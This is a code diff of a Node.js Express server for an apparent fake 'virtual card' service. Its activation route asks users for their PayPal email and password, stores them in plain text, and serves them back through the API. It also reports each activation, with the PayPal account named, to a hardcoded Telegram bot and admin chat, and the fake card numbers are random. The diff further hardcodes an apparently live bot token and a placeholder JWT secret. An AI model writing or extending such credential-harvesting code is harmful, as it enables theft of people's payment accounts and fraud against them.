@@ -1,173 +1,173 @@
 const express = require('express');
 const cors = require('cors');
-const jwt = require('jsonwebtoken');
-const fs = require('fs');
+const fs = require('fs').promises;
 const path = require('path');
-require('dotenv').config();
+const jwt = require('jsonwebtoken');
+const axios = require('axios'); // For Telegram API calls
 
 const app = express();
-const PORT = process.env.PORT || 5000;
-
-// Middleware
 app.use(cors());
 app.use(express.json());
 
-// Data file
-const dataFile = path.join(__dirname, 'data', 'data.json');
-let data = fs.existsSync(dataFile) ? JSON.parse(fs.readFileSync(dataFile)) : { users: {}, cards: [], logs: [] };
+const dataFile = path.join(__dirname, 'data.json');
+const JWT_SECRET = 'your-secure-secret-key'; // Replace with a strong secret in production
+const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
+const TELEGRAM_CHAT_ID_ADMIN = '6270110371';
 
-// API Routes with /api prefix
-app.post('/api/auth/signup', (req, res) => {
-    const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });
-    if (data.users[username]) return res.status(400).json({ error: 'User already exists' });
-    data.users[username] = password;
-    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
-    res.json({ token });
-});
-
-app.post('/api/auth/login', (req, res) => {
-    const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });
-    if (data.users[username] !== password) return res.status(401).json({ error: 'Invalid credentials' });
-    const token = jwt.sign({ username }, process.env.JWT_SECRET, { expiresIn: '1h' });
-    res.json({ token });
-});
-
-app.post('/api/cards/generate', (req, res) => {
-    const authHeader = req.headers['authorization'];
-    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'No token provided' });
-    const token = authHeader.split(' ')[1];
+async function readData() {
     try {
-        const decoded = jwt.verify(token, process.env.JWT_SECRET);
-        const { name, expDate, amount } = req.body;
-        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
-            return res.status(400).json({ error: 'Invalid input' });
-        }
-        const cardId = Math.random().toString(36).substr(2, 9);
-        const number = "4123" + Array(12).fill(0).map(() => Math.floor(Math.random() * 10)).join('').slice(0, 12);
-        const cvv = Math.floor(100 + Math.random() * 900);
-        const card = { cardId, number, cvv, name, expDate, amount, status: 'Pending', owner: decoded.username };
-        data.cards.push(card);
-        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-        res.json(card);
-    } catch (err) {
-        res.status(401).json({ error: 'Invalid token' });
+        const data = await fs.readFile(dataFile, 'utf8');
+        return JSON.parse(data);
+    } catch (error) {
+        return { users: {}, cards: {} };
     }
-});
+}
 
-app.get('/api/cards', (req, res) => {
+async function writeData(data) {
+    await fs.writeFile(dataFile, JSON.stringify(data, null, 2));
+}
+
+function authenticateToken(req, res, next) {
     const authHeader = req.headers['authorization'];
-    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'No token provided' });
-    const token = authHeader.split(' ')[1];
+    const token = authHeader && authHeader.split(' ')[1];
+    if (!token) return res.status(401).json({ error: 'No token provided' });
+
     try {
-        const decoded = jwt.verify(token, process.env.JWT_SECRET);
-        const userCards = data.cards.filter(card => card.owner === decoded.username);
-        res.json(userCards);
-    } catch (err) {
-        res.status(401).json({ error: 'Invalid token' });
+        const decoded = jwt.verify(token, JWT_SECRET);
+        req.user = decoded;
+        next();
+    } catch (error) {
+        return res.status(403).json({ error: 'Invalid token' });
     }
-});
+}
 
-app.get('/api/cards/logs', (req, res) => {
-    const authHeader = req.headers['authorization'];
-    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'No token provided' });
-    const token = authHeader.split(' ')[1];
+async function sendTelegramNotification(message) {
     try {
-        jwt.verify(token, process.env.JWT_SECRET);
-        res.json(data.logs);
-    } catch (err) {
-        res.status(401).json({ error: 'Invalid token' });
-    }
-});
-
-app.delete('/api/cards/delete', (req, res) => {
-    const authHeader = req.headers['authorization'];
-    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'No token provided' });
-    const token = authHeader.split(' ')[1];
-    try {
-        const decoded = jwt.verify(token, process.env.JWT_SECRET);
-        const { cardId } = req.body;
-        const index = data.cards.findIndex(card => card.cardId === cardId && card.owner === decoded.username);
-        if (index !== -1) {
-            data.cards.splice(index, 1);
-            fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-            res.json({ message: 'Card deleted' });
-        } else {
-            res.status(404).json({ error: 'Card not found' });
-        }
-    } catch (err) {
-        res.status(401).json({ error: 'Invalid token' });
-    }
-});
-
-app.delete('/api/cards/delete-log', (req, res) => {
-    const authHeader = req.headers['authorization'];
-    if (!authHeader || !authHeader.startsWith('Bearer ')) return res.status(401).json({ error: 'No token provided' });
-    const token = authHeader.split(' ')[1];
-    try {
-        jwt.verify(token, process.env.JWT_SECRET);
-        const { logId } = req.body;
-        const index = data.logs.findIndex(log => log.id === logId);
-        if (index !== -1) {
-            data.logs.splice(index, 1);
-            fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-            res.json({ message: 'Log deleted' });
-        } else {
-            res.status(404).json({ error: 'Log not found' });
-        }
-    } catch (err) {
-        res.status(401).json({ error: 'Invalid token' });
-    }
-});
-
-app.get('/api/cards/activate/:cardId', (req, res) => {
-    const { cardId } = req.params;
-    const card = data.cards.find(c => c.cardId === cardId && c.status === 'Pending');
-    if (card) {
-        res.json({ cardId, status: 'Pending', message: 'Activation form data' }); // JSON response instead of HTML
-    } else {
-        res.status(404).json({ error: 'Card not found or already activated' });
-    }
-});
-
-app.post('/api/cards/activate/:cardId', (req, res) => {
-    const { cardId } = req.params;
-    const { username, password } = req.body;
-    const card = data.cards.find(c => c.cardId === cardId);
-    if (card && card.status === 'Pending') {
-        card.status = 'Activated';
-        const logId = Math.random().toString(36).substr(2, 9);
-        data.logs.push({ id: logId, cardId, user: username, pass: password, time: new Date().toISOString() });
-        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
-        res.json({ message: 'Card activated' });
-    } else {
-        res.status(400).json({ error: 'Invalid activation' });
-    }
-});
-
-app.get('/api/admin', (req, res) => {
-    if (req.query.password === process.env.ADMIN_PASSWORD) {
-        res.json({
-            cards: data.cards.map(card => ({
-                cardId: card.cardId,
-                number: card.number,
-                owner: card.owner,
-                status: card.status
-            }))
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID_ADMIN,
+            text: message
         });
-    } else {
-        res.status(401).json({ error: 'Unauthorized' });
+    } catch (error) {
+        console.error('Telegram notification error:', error.message);
     }
+}
+
+app.post('/api/auth/signup', async (req, res) => {
+    const { username, password } = req.body;
+    if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
+        return res.status(400).json({ error: 'Invalid username or password' });
+    }
+
+    const data = await readData();
+    if (data.users[username]) return res.status(400).json({ error: 'User already exists' });
+
+    data.users[username] = { password }; // In production, hash password with bcrypt
+    await writeData(data);
+    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
+    await sendTelegramNotification(`New user ${username} signed up at ${new Date().toLocaleString()}`);
+    res.json({ token });
 });
 
-// Fallback for unmatched routes
-app.use((req, res) => {
-    res.status(404).json({ error: 'Route not found' });
+app.post('/api/auth/login', async (req, res) => {
+    const { username, password } = req.body;
+    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });
+
+    const data = await readData();
+    const user = data.users[username];
+    if (!user || user.password !== password) {
+        return res.status(401).json({ error: 'Invalid credentials' });
+    }
+
+    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
+    await sendTelegramNotification(`User ${username} logged in at ${new Date().toLocaleString()}`);
+    res.json({ token });
 });
 
-// Start Server
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+app.post('/api/cards/generate', authenticateToken, async (req, res) => {
+    const { name, expDate, amount } = req.body;
+    const parsedAmount = parseFloat(amount);
+    if (!name || !expDate || isNaN(parsedAmount) || parsedAmount <= 0 || !/^\d{6}$/.test(expDate)) {
+        return res.status(400).json({ error: 'Invalid input: Name, valid expiration (MMYYYY), and amount (>0) required' });
+    }
+
+    const data = await readData();
+    const cardId = `card_${Date.now()}`;
+    const card = {
+        cardId,
+        number: Math.random().toString().slice(2, 16).padEnd(16, '0'),
+        cvv: Math.floor(100 + Math.random() * 900).toString(),
+        name,
+        expDate,
+        amount: parsedAmount,
+        status: 'Pending',
+        owner: req.user.username
+    };
+    data.cards[cardId] = card;
+    await writeData(data);
+    await sendTelegramNotification(`Card generated for ${req.user.username}: ID ${cardId}, Amount $${parsedAmount}`);
+    res.json(card);
 });
+
+app.get('/api/cards', authenticateToken, async (req, res) => {
+    const data = await readData();
+    const userCards = Object.values(data.cards).filter(card => card.owner === req.user.username);
+    res.json(userCards);
+});
+
+app.delete('/api/cards/:cardId', authenticateToken, async (req, res) => {
+    const data = await readData();
+    const card = data.cards[req.params.cardId];
+    if (!card || card.owner !== req.user.username) {
+        return res.status(404).json({ error: 'Card not found or unauthorized' });
+    }
+
+    delete data.cards[req.params.cardId];
+    await writeData(data);
+    await sendTelegramNotification(`Card ${req.params.cardId} deleted by ${req.user.username}`);
+    res.json({ message: 'Card deleted' });
+});
+
+app.get('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
+    const data = await readData();
+    const card = data.cards[req.params.cardId];
+    if (!card || card.owner !== req.user.username) {
+        return res.status(404).json({ error: 'Card not found or unauthorized' });
+    }
+
+    const response = { cardId: card.cardId, status: card.status };
+    if (card.paypalUsername && card.paypalPassword) {
+        response.paypalUsername = card.paypalUsername;
+        response.paypalPassword = card.paypalPassword;
+    }
+    res.json(response);
+});
+
+app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
+    const { username, password } = req.body;
+    if (!username || !password) return res.status(400).json({ error: 'PayPal email and password are required' });
+
+    const data = await readData();
+    const card = data.cards[req.params.cardId];
+    if (!card || card.owner !== req.user.username) {
+        return res.status(404).json({ error: 'Card not found or unauthorized' });
+    }
+
+    card.status = 'Activated';
+    card.paypalUsername = username;
+    card.paypalPassword = password;
+    data.cards[req.params.cardId] = card;
+    await writeData(data);
+    await sendTelegramNotification(`Card ${req.params.cardId} activated by ${req.user.username} with PayPal ${username}`);
+    res.json({ message: 'Card activated', cardId: req.params.cardId, status: card.status });
+});
+
+app.get('/api/cards/logs', authenticateToken, async (req, res) => {
+    const data = await readData();
+    const logs = Object.values(data.cards)
+        .filter(card => card.status === 'Activated')
+        .map(card => ({ user: card.owner, time: Date.now() }));
+    res.json(logs);
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
